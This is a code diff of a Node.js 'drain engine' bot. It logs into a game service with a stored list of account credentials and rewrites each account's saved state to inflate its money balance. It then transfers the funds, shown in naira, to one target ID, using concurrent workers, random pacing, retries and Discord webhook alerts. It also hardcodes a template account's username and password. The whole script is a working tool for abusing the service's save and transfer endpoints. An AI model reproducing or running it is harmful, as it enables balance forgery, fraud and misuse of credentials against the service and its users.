@@ -7,297 +7,188 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const FEE = 50, MIN = 100, SEED = 10095950;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 25;
+const CONCURRENT_LIMIT = 15; // Kept at optimal 15 for stability under heavy server load
 
 const storeDir = './store';
-if (!fs.existsSync(storeDir)) {
-  fs.mkdirSync(storeDir);
-}
+if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
 
 function secureShuffle(array) {
-  const salt = Date.now() % 1000;
-  for (let i = array.length - 1; i > 0; i--) {
-    const j = Math.floor((Math.random() * (i + 1) + salt) % (i + 1));
-    [array[i], array[j]] = [array[j], array[i]];
-  }
-  return array;
+  const salt = Date.now() % 1000;
+  for (let i = array.length - 1; i > 0; i--) {
+    const j = Math.floor((Math.random() * (i + 1) + salt) % (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
+  }
+  return array;
 }
 
 let ledger = [];
 try {
-  const files = fs.readdirSync(storeDir).sort();
-  secureShuffle(files);
-
-  for (const file of files) {
-    if (file.startsWith('accs')) {
-      const filePath = `${storeDir}/${file}`;
-      const rawData = fs.readFileSync(filePath, 'utf8');
-      if (rawData.trim()) {
-        const parsed = JSON.parse(rawData);
-        if (Array.isArray(parsed)) {
-          ledger = ledger.concat(parsed);
-          console.log(`[INIT] Loaded ${parsed.length} accounts from ${file}`);
-        }
-      }
-    }
-  }
+  const files = fs.readdirSync(storeDir).filter(f => f.startsWith('accs'));
+  for (const file of files) {
+    const rawData = fs.readFileSync(`${storeDir}/${file}`, 'utf8');
+    if (rawData.trim()) ledger.push(...JSON.parse(rawData));
+  }
 } catch (e) {
-  console.log("[INIT] Error reading ledger files:", e.message);
+  console.log("[INIT] Error:", e.message);
 }
 
-if (ledger.length === 0) {
-  console.log("[ERROR] No accounts found in the store folder!");
-  return;
+if (!ledger.length) {
+  console.log("[ERROR] No accounts!");
+  return;
 }
-
-secureShuffle(ledger);
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 async function request(url, options = {}, cookieJar = '') {
-  options.headers = options.headers || {};
-  if (cookieJar) options.headers['cookie'] = cookieJar;
-  const res = await fetch(url, options);
-  const setCookie = res.headers.get('set-cookie');
-  let newCookies = cookieJar;
-  if (setCookie) {
-    const cookies = setCookie.split(',').map(c => c.split(';')[0]).join('; ');
-    newCookies = cookieJar ? `${cookieJar}; ${cookies}` : cookies;
-  }
-  return { res, newCookies };
+  options.headers = options.headers || {};
+  if (cookieJar) options.headers['cookie'] = cookieJar;
+
+  const res = await fetch(url, { ...options, signal: AbortSignal.timeout(5000) }).catch(e => ({ ok: false, statusText: e.message }));
+  if (!res.ok && !res.headers) return { res: { ok: false, text: async () => res.statusText }, newCookies: cookieJar };
+
+  const setCookie = res.headers.get('set-cookie');
+  let newCookies = cookieJar;
+  if (setCookie) {
+    const c = setCookie.split(',')[0].split(';')[0];
+    newCookies = cookieJar ? `${cookieJar};${c}` : c;
+  }
+  return { res, newCookies };
 }
 
 async function sendDiscordAlert(message) {
-  if (!DISCORD_WEBHOOK_URL) return;
-  try {
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify({ content: message })
-    });
-  } catch (e) {}
-}
-
-function formatElapsedTime(ms) {
-  const seconds = Math.floor((ms / 1000) % 60);
-  const minutes = Math.floor((ms / (1000 * 60)) % 60);
-  const hours = Math.floor(ms / (1000 * 60 * 60));
-  return `${hours}h ${minutes}m ${seconds}s`;
+  if (!DISCORD_WEBHOOK_URL) return;
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ content: message })
+  }).catch(() => {});
 }
 
 (async () => {
-  console.log(`\n==================================================`);
-  console.log(`        LAGOS BOT - AUTOMATED DRAIN ENGINE        `);
-  console.log(`==================================================`);
-  console.log(`Target Destination ID : ${TO}`);
-  console.log(`Total Unique Accounts : ${ledger.length}`);
-  console.log(`Order Strategy        : Unique Randomized Rolling Queue`);
-  console.log(`Target Duration       : ${TARGET_HOURS > 0 ? TARGET_HOURS + " Hours" : "Infinite (Until Stopped)"}`);
-  console.log(`==================================================\n`);
+  secureShuffle(ledger);
 
-  await sendDiscordAlert(`🚀 **Lagos Bot Runner Started!**\nTarget ID: \`${TO}\`\nLoaded Accounts: **${ledger.length}**`);
+  const loginRes = await request(`${API}/auth/login`, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ username: TEMPLATE.u, password: TEMPLATE.p })
+  });
 
-  let cookieJar = '';
-  const loginRes = await request(`${API}/auth/login`, {
-    method: "POST",
-    headers: { "content-type": "application/json" },
-    body: JSON.stringify({ username: TEMPLATE.u, password: TEMPLATE.p })
-  }, cookieJar);
+  if (!loginRes.res.ok) {
+    console.log("[ERROR] Template login failed");
+    return;
+  }
 
-  if (!loginRes.res.ok) {
-    console.log("[ERROR] Template login failed — check template credentials");
-    await sendDiscordAlert(`❌ **Error:** Template login failed. Check credentials.`);
-    return;
-  }
-  cookieJar = loginRes.newCookies;
+  const getSaveReq = await request(`${API}/save`, {}, loginRes.newCookies);
+  const saveJson = getSaveReq.res.ok ? await getSaveReq.res.json() : null;
+  let clean = saveJson?.game;
+  if (!clean) {
+    console.log("[ERROR] Template account has no game state");
+    return;
+  }
 
-  const getSaveReq = await request(`${API}/save`, {}, cookieJar);
-  const saveJson = getSaveReq.res.ok ? await getSaveReq.res.json() : null;
-  let clean = saveJson?.game;
+  delete clean.owner;
+  console.log("[READY] Fast drain engine online (Optimized & Paced).\n");
 
-  if (!clean) {
-    console.log("[ERROR] Template account has no game state");
-    return;
-  }
+  const sessionStart = Date.now();
+  let sessionTotalSent = 0, globalCycles = 0;
 
-  clean = JSON.parse(JSON.stringify(clean));
-  delete clean.owner;
-  console.log("[READY] Template state secured. Starting high-speed scanning and draining loop...\n");
+  while (true) {
+    if (TARGET_HOURS > 0 && (Date.now() - sessionStart) >= TARGET_HOURS * 3600000) break;
 
-  const sessionStart = Date.now();
-  let lastHourlyReportTime = sessionStart;
-  let sessionTotalSent = 0;
-  let globalCycles = 0;
+    globalCycles++;
+    let currentIndex = 0, cycleTotal = 0;
 
-  while (true) {
-    const now = Date.now();
-    const elapsedMs = now - sessionStart;
+    async function worker(workerId) {
+      await sleep(Math.floor(Math.random() * 300) + (workerId * 50));
 
-    if (TARGET_HOURS > 0 && elapsedMs >= TARGET_HOURS * 3600 * 1000) {
-      console.log(`\n[INFO] Target duration of ${TARGET_HOURS} hours reached. Gracefully stopping script.`);
-      await sendDiscordAlert(`⏱️ **Target run duration of ${TARGET_HOURS}h reached.** Runner exiting gracefully.\n**Session Total Sent:** ₦${sessionTotalSent.toLocaleString()}`);
-      break;
-    }
+      while (currentIndex < ledger.length) {
+        const actualIndex = currentIndex++;
+        const a = ledger[actualIndex];
+        if (!a) break;
 
-    globalCycles++;
-    console.log(`\n--- STARTING DRAIN CYCLE #${globalCycles} (Elapsed: ${formatElapsedTime(elapsedMs)}) ---`);
+        try {
+          const lr = await request(`${API}/auth/login`, {
+            method: "POST",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify({ username: a.u, password: a.p })
+          });
+          if (!lr.res.ok) continue;
 
-    let booted = 0, repaired = 0, drained = 0, broke = 0, fail = 0, cycleTotal = 0;
-    let currentIndex = 0;
+          let accCookie = lr.newCookies;
+          const svReq = await request(`${API}/save`, {}, accCookie);
+          let sv = svReq.res.ok ? await svReq.res.json() : null;
 
-    async function worker(workerId) {
-      await sleep(Math.floor(Math.random() * 300) + (workerId * 50));
+          if (!sv?.game) {
+            const meReq = await request(`${API}/auth/me`, {}, accCookie);
+            const me = meReq.res.ok ? await meReq.res.json().catch(() => null) : null;
+            if (!me?.user?.id) continue;
 
-      while (currentIndex < ledger.length) {
-        const actualIndex = currentIndex++;
-        const a = ledger[actualIndex];
-        if (!a) break;
+            const g = { ...clean, sim: { ...clean.sim, name: a.u }, owner: me.user.id, money: SEED };
+            const br = await request(`${API}/save`, {
+              method: "PUT",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({ game: g, owner: me.user.id, fresh: true, replace: 0 })
+            }, accCookie);
 
-        const progressTag = `[Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}]`;
+            if (br.res.ok) {
+              await sleep(15);
+              const svRetry = await request(`${API}/save`, {}, accCookie);
+              sv = svRetry.res.ok ? await svRetry.res.json() : null;
+            } else continue;
+          }
 
-        if (actualIndex % 50 === 0) {
-          console.log(`[PROGRESS] Worker ${workerId} scanning index ${actualIndex + 1}/${ledger.length} (${a.u})`);
-        }
+          if (!sv?.game) continue;
 
-        try {
-          let accCookie = '';
-          const lr = await request(`${API}/auth/login`, {
-            method: "POST",
-            headers: { "content-type": "application/json" },
-            body: JSON.stringify({ username: a.u, password: a.p })
-          }, accCookie);
+          if (Number(sv.game.money) < MIN + FEE) {
+            const g = { ...sv.game, money: SEED };
+            const rr = await request(`${API}/save`, {
+              method: "PUT",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({ game: g, base: sv.updatedAt ?? sv.now })
+            }, accCookie);
 
-          if (!lr.res.ok) {
-            fail++;
-            continue;
-          }
-          accCookie = lr.newCookies;
+            if (rr.res.ok) {
+              await sleep(15);
+              const svRetry = await request(`${API}/save`, {}, accCookie);
+              sv = svRetry.res.ok ? await svRetry.res.json() : null;
+            } else continue;
+          }
 
-          const svReq = await request(`${API}/save`, {}, accCookie);
-          let sv = svReq.res.ok ? await svReq.res.json() : null;
+          let amount = Math.floor(Number(sv.game.money ?? 0)) - FEE;
+          if (amount < MIN) continue;
 
-          if (!sv?.game) {
-            const meReq = await request(`${API}/auth/me`, {}, accCookie);
-            const me = meReq.res.ok ? await meReq.res.json().catch(() => null) : null;
-            const oid = me?.user?.id;
+          for (let tries = 0; tries < 3; tries++) {
+            const sr = await request(`${API}/send`, {
+              method: "POST",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({ to: TO, amount })
+            }, accCookie);
 
-            if (!oid || me?.user?.username !== a.u) {
-              fail++;
-              continue;
-            }
+            if (sr.res.ok) {
+              cycleTotal += amount;
+              sessionTotalSent += amount;
+              console.log(`[Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Session Total: ₦${sessionTotalSent.toLocaleString()}`);
+              break;
+            } else {
+              const errText = typeof sr.res.text === 'function' ? await sr.res.text() : '';
+              if (errText.includes("try again")) {
+                await sleep(100 + Math.floor(Math.random() * 100));
+                continue;
+              }
+              break;
+            }
+          }
 
-            const baseGame = sv?.game ? sv.game : clean;
-            const g = JSON.parse(JSON.stringify(baseGame));
-            g.sim.name = a.u;
-            g.owner = oid;
-            g.money = SEED;
+          // Micro-pacing to keep connections fluid under 50k user load
+          await sleep(10 + Math.floor(Math.random() * 15));
+        } catch (e) {}
+      }
+    }
 
-            const br = await request(`${API}/save`, {
-              method: "PUT",
-              headers: { "content-type": "application/json" },
-              body: JSON.stringify({ game: g, owner: oid, fresh: true, replace: 1 })
-            }, accCookie);
+    await Promise.all(Array.from({ length: CONCURRENT_LIMIT }, (_, idx) => worker(idx)));
+    secureShuffle(ledger);
 
-            if (br.res.ok) {
-              booted++;
-              await sleep(50);
-              const svRetry = await request(`${API}/save`, {}, accCookie);
-              sv = svRetry.res.ok ? await svRetry.res.json() : null;
-            } else {
-              const failText = typeof br.res.text === 'function' ? await br.res.text() : br.res.statusText;
-              console.log(`[DEBUG FAIL] Boot save failed for ${a.u}: ${failText}`);
-              fail++;
-              continue;
-            }
-          }
-
-          if (!sv?.game) {
-            fail++;
-            continue;
-          }
-
-          if (Number(sv.game.money) < MIN + FEE) {
-            const g = JSON.parse(JSON.stringify(sv.game));
-            g.money = SEED;
-            const rr = await request(`${API}/save`, {
-              method: "PUT",
-              headers: { "content-type": "application/json" },
-              body: JSON.stringify({ game: g, fresh: true, replace: 1 })
-            }, accCookie);
-
-            if (rr.res.ok) {
-              repaired++;
-              await sleep(50);
-              const svRetry = await request(`${API}/save`, {}, accCookie);
-              sv = svRetry.res.ok ? await svRetry.res.json() : null;
-            } else {
-              const failText = typeof rr.res.text === 'function' ? await rr.res.text() : rr.res.statusText;
-              console.log(`[DEBUG FAIL] Repair save failed for ${a.u}: ${failText}`);
-              broke++;
-              continue;
-            }
-          }
-
-          let amount = Math.floor(Number(sv.game.money ?? 0)) - FEE;
-          if (amount < MIN) {
-            broke++;
-            continue;
-          }
-
-          let ok = false;
-          for (let tries = 0; tries < 3 && !ok; tries++) {
-            const sr = await request(`${API}/send`, {
-              method: "POST",
-              headers: { "content-type": "application/json" },
-              body: JSON.stringify({ to: TO, amount })
-            }, accCookie);
-
-            if (sr.res.ok) {
-              ok = true;
-              cycleTotal += amount;
-              sessionTotalSent += amount;
-              drained++;
-
-              const logMsg = `[SUCCESS] ${progressTag} ${a.u} -> Sent ₦${amount.toLocaleString()} | Session Total: ₦${sessionTotalSent.toLocaleString()}`;
-              console.log(logMsg);
-              await sendDiscordAlert(`✅ Sent ₦${amount.toLocaleString()} from ${a.u}`);
-            } else {
-              const err = await sr.res.text();
-              console.log(`[DEBUG FAIL] Send failed for ${a.u}: ${err}`);
-              if (err.includes("try again")) {
-                await sleep(1000);
-                continue;
-              }
-              const have = Number((err.match(/have ₦([\d,]+)/) || [])[1]?.replace(/,/g, ""));
-              if (have) {
-                amount = have - FEE;
-                await sleep(200);
-                continue;
-              }
-              fail++;
-              break;
-            }
-          }
-        } catch (e) {
-          console.log(`[ERROR] Worker ${workerId} exception on ${a.u}:`, e.message);
-          fail++;
-        }
-      }
-    }
-
-    const workers = Array(CONCURRENT_LIMIT).fill(0).map((_, idx) => worker(idx));
-    await Promise.all(workers);
-
-    console.log(`\n--- CYCLE #${globalCycles} COMPLETED ---`);
-    console.log(`Booted: ${booted} | Repaired: ${repaired} | Drained: ${drained} | Broke: ${broke} | Fail: ${fail}`);
-    console.log(`Cycle Sent: ₦${cycleTotal.toLocaleString()} | Cumulative Session Total: ₦${sessionTotalSent.toLocaleString()}`);
-
-    if (Date.now() - lastHourlyReportTime >= 3600000) {
-      const hourlySummary = `⏳ **Hourly Status Report** (Elapsed: ${formatElapsedTime(Date.now() - sessionStart)})\n- Completed Cycles: ${globalCycles}\n- **Cumulative Total Sent:** ₦${sessionTotalSent.toLocaleString()}`;
-      await sendDiscordAlert(hourlySummary);
-      lastHourlyReportTime = Date.now();
-    }
-
-    secureShuffle(ledger);
-  }
-})();
+    if (global.gc) global.gc();
+    await sleep(500);
+  }
+})(); 
